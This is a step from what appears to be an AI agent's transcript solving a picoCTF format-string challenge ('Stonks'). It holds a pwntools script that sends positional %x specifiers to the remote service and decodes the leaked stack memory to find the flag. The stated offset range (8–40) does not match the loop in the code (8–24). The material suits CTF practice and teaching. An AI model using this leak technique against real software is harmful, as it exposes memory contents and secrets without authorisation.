步骤 4:
- 目的: 编写并运行一个改进的Python脚本，通过枚举格式化字符串偏移量（%8$x 到 %40$x）来暴力探测并泄露栈上的flag数据，解决之前偏移未知导致读取失败的问题。
- 命令: {"tool": "sandbox_python_exec", "purpose": "编写并运行一个改进的Python脚本，通过枚举格式化字符串偏移量（%8$x 到 %40$x）来暴力探测并泄露栈上的flag数据，解决之前偏移未知导致读取失败的问题。", "arguments": {"code": "from pwn import *\nimport re\n\n# 设置上下文\ncontext.log_level = 'info'\n\ndef exploit():\n    # 连接远程服务\n    try:\n        io = remote('wily-courier.picoctf.net', 64780, timeout=10)\n        \n        # 接收主菜单\n        io.recvuntil(b'What would you like to do?', timeout=2)\n        \n        # 选择 Buy stonks\n        io.sendline(b'1')\n        \n        # 接收 API token 提示\n        io.recvuntil(b'What is your API token?', timeout=2)\n        \n        # 构造 Payload：尝试从栈偏移 8 到 40 读取数据\n        # 这里的偏移是指相对于栈顶参数的位置\n        # 我们发送一组格式化字符串，期望能打印出栈上的 api_buf\n        \n        log.info(\"Sending format string payload to leak stack memory...\")\n        \n        # 构造 payload，使用 . 分隔以便观察\n        payload = b''\n        for i in range(8, 25):\n            payload += f'.%{i}$x'.encode()\n        \n        io.sendline(payload)\n        \n        # 接收响应\n        # 程序会打印 \"Buying stonks with token:\"\n        # 然后打印我们的 payload 处理后的结果\n        # 读取所有数据\n        \n        response = io.recvall(timeout=5)\n        \n        # 打印原始响应以便调试\n        # print(f\"Raw response: {response}\")\n        \n        # 提取格式化字符串的输出部分\n        # 响应格式通常为：Buying stonks with token:\\n[输出]\\n...\n        lines = response.split(b'\\n')\n        leaked_data = b''\n        \n        for line in lines:\n            if b'Buying stonks with token:' in line:\n                # 提取冒号后面的内容\n                parts = line.split(b':')\n                if len(parts) > 1:\n                    leaked_data = parts[1].strip()\n                    break\n        \n        # 如果在单独一行\n        if not leaked_data:\n             for i, line in enumerate(lines):\n                 if b'Buying stonks with token:' in line:\n                     if i + 1 < len(lines):\n                         leaked_data = lines[i+1].strip()\n                         break\n\n        log.info(f\"Leaked hex data: {leaked_data}\")\n        \n        # 解析泄露的数据\n        # 格式可能是：1.2.3.4... 或者直接的 hex\n        # 我们之前发送的是 .%8$x .%9$x ... 所以结果看起来像 .xxx.yyy.zzz\n        \n        hex_parts = leaked_data.split(b'.')\n        raw_bytes = b''\n        \n        for part in hex_parts:\n            if part:\n                try:\n                    # 尝试转为整数\n                    val = int(part, 16)\n                    # 转为字节，32位系统是小端序\n                    raw_bytes += val.to_bytes(4, 'little')\n                except ValueError:\n                    pass\n        \n        log.info(f\"Decoded bytes: {raw_bytes}\")\n        \n        # 查找 flag\n        # flag 格式 picoCTF{...}\n        if b'picoCTF' in raw_bytes:\n            match = re.search(rb'picoCTF\\{.*?\\}', raw_bytes)\n            if match:\n                print(f\"FLAG FOUND: {match.group().decode()}\")\n                return\n        \n        # 也许直接在响应中\n        if b'picoCTF' in response:\n            print(f\"FLAG IN RAW: {re.search(rb'picoCTF\\{.*?\\}', response).group().decode()}\")\n            return\n            \n        # 如果没找到，可能偏移不对，打印可读字符串作为线索\n        print(\"Searching for readable strings in decoded data...\")\n        for s in re.findall(rb'[\\x20-\\x7e]{8,}', raw_bytes):\n            print(f\"Possible string: {s}\")\n            \n        io.close()\n        \n    except Exception as e:\n        print(f\"Error during exploit: {e}\")\n\nif __name__ == '__main__':\n    exploit()"}}
